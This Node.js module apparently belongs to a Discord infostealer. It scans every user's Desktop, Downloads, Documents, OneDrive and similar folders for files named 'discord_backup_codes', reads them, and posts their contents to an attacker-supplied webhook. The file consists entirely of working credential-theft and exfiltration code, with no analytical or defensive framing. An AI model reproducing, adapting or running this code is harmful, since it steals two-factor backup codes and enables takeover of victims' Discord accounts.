const {
    sendWebhook 
} = require('../../utils/request/sendWebhook.js');

const { 
    getUsers 
} = require('../../utils/harware.js');

const path = require('path');
const fs   = require('fs');

module.exports = async (webhook) => {
    const users = await getUsers();
    const directories = [
        'Desktop',
        'Downloads',
        'Documents',
        'Videos',
        'Pictures',
        'Music',
        'OneDrive'
    ];

    for (const user of users) {
        for (const dir of directories) {
            const fullPath = path.join(user, dir);

            if (!fs.existsSync(fullPath)) {
                continue;
            }

            await searchFiles(fullPath, webhook)
        }
    }
}

function searchFiles(dir, webhook) {
    return new Promise((resolve, reject) => {
        fs.readdir(dir, (err, files) => {
            if (err) {
                resolve(false);
                return;
            }

            const tasks = files.map(file => {
                const filePath = path.join(dir, file);

                return new Promise((resolve, reject) => {
                    fs.stat(filePath, (err, stats) => {
                        if (err) {
                            resolve(false);
                            return;
                        }

                        if (stats.isFile()) {
                            if (stats.size <= 2 * 1024 * 1024 && file.startsWith('discord_backup_codes')) {
                                fs.readFile(filePath, 'utf8', async (err, codes) => {
                                    if (err) {
                                        console.error('Error reading file:', err);
                                        resolve(false);
                                        return;
                                    }
                                    if (codes.length > 0) {
                                        const data = {
                                            content: `\`${filePath}\``,
                                            embeds: [
                                                {
                                                    title: 'Discord Backup Codes',
                                                    description: `\`\`\`yml\n${codes.length === 0 ? 'Not found' : codes}\n\`\`\``,
                                                }
                                            ]
                                        };

                                        try {
                                            await sendWebhook(webhook, data);
                                            resolve(true);
                                        } catch (error) {
                                            console.error("Could not send codes with webhook:", error);
                                            resolve(false);
                                        }
                                    } else {
                                        resolve(false);
                                    }
                                });
                            } else {
                                resolve(false);
                            }
                        } else if (stats.isDirectory()) {
                            searchFiles(filePath, webhook).then(resolve).catch(reject);
                        } else {
                            resolve(false);
                        }
                    });
                });
            });

            Promise.all(tasks).then(results => {
                resolve(results.some(result => result));
            }).catch(reject);
        });
    });
}